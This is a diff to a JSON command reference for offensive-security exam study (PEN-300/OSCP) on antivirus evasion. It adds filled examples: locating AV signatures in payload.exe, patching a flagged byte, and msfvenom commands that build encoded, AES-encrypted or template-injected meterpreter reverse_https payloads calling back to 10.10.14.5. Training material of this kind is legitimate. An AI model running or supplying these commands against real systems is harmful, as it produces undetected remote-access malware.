@@ -36,7 +36,7 @@
           "required": true
         }
       ],
-      "notes": "Syntax:\nRun on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise.\n\nTypical workflow:\n10000→1000→100→10→1 byte intervals.\n\nTakes 15-30 minutes per signature.\n\nPractice on known-flagged payloads before exam.\n\nTime estimate:\n15-30 minutes per signature References:\ndocs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative:\nManual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck",
+      "notes": "Syntax:\nRun on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise.\n\nTypical workflow:\n10000\u21921000\u2192100\u219210\u21921 byte intervals.\n\nTakes 15-30 minutes per signature.\n\nPractice on known-flagged payloads before exam.\n\nTime estimate:\n15-30 minutes per signature References:\ndocs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative:\nManual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck",
       "success_indicators": [
         "Creates test files in output directory. Scan each with AV - undetected file shows safe range. Detected file shows signature range."
       ],
@@ -45,7 +45,8 @@
         "Execution policy - Run: Set-ExecutionPolicy Bypass -Scope Process",
         "AV interference - Exclude output directory from real-time scanning",
         "Multiple signatures - Repeat process after fixing first signature"
-      ]
+      ],
+      "filled_example": "Import-Module .\\Find-AVSignature.ps1\nFind-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\\Tools\\payload.exe -OutPath C:\\Tools\\avtest -Verbose -Force"
     },
     {
       "id": "modify-signature-bytes",
@@ -89,7 +90,8 @@
         "Still detected - Multiple signatures exist, repeat Find-AVSignature",
         "Crashes on execution - Overwrote functional code instead of padding/data section",
         "False sense of security - AV may update signatures"
-      ]
+      ],
+      "filled_example": "$bytes = [System.IO.File]::ReadAllBytes('C:\\Tools\\payload.exe')\n$bytes[18867] = 0x00\n[System.IO.File]::WriteAllBytes('C:\\Tools\\payload_modified.exe', $bytes)"
     },
     {
       "id": "msfvenom-encoder-shikata",
@@ -146,7 +148,8 @@
         "Still detected - Shikata heavily signatured, combine with other techniques",
         "Payload fails to execute - Over-encoding can corrupt payload",
         "x86/x64 mismatch - Shikata is x86 only, use zutto_dekiru for x64"
-      ]
+      ],
+      "filled_example": "msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe"
     },
     {
       "id": "msfvenom-encoder-zutto",
@@ -203,7 +206,8 @@
         "Still detected - Same issue as shikata, well-known encoder",
         "Architecture mismatch - Ensure target is 64-bit",
         "Payload corruption - Excessive iterations"
-      ]
+      ],
+      "filled_example": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x64/zutto_dekiru -i 10 -f exe -o payload64.exe"
     },
     {
       "id": "msfvenom-encrypt-aes",
@@ -259,7 +263,8 @@
         "Decryption stub detected - msfvenom's stub is known, use custom loaders",
         "Key visible in strings - Obfuscate key in custom loader",
         "Still flagged - AES alone insufficient, add heuristic evasion"
-      ]
+      ],
+      "filled_example": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 --encrypt aes256 --encrypt-key MySecretKey2024 -f exe -o payload_aes.exe"
     },
     {
       "id": "msfvenom-template-injection",
@@ -316,7 +321,8 @@
         "Architecture mismatch - Use x64 template for x64 payload",
         "Still detected - Injection method is known, combine with encryption",
         "-k flag breaks payload - Don't use -k if original functionality not needed"
-      ]
+      ],
+      "filled_example": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x /usr/share/windows-binaries/nc.exe -f exe -o payload_injected.exe"
     },
     {
       "id": "clamscan-test",
@@ -349,7 +355,8 @@
         "ClamAV not installed - Download and install from clamav.net",
         "Database outdated - Run freshclam.exe to update",
         "False negatives - ClamAV less comprehensive than commercial AV"
-      ]
+      ],
+      "filled_example": "cd 'C:\\Program Files\\ClamAV\\'\n.\\clamscan.exe C:\\Tools\\payload.exe"
     }
   ],
   "oscp_relevance": "Critical for payload delivery. Msfvenom defaults are heavily signatured. Must understand encoding, encryption, and signature location for exam success.",
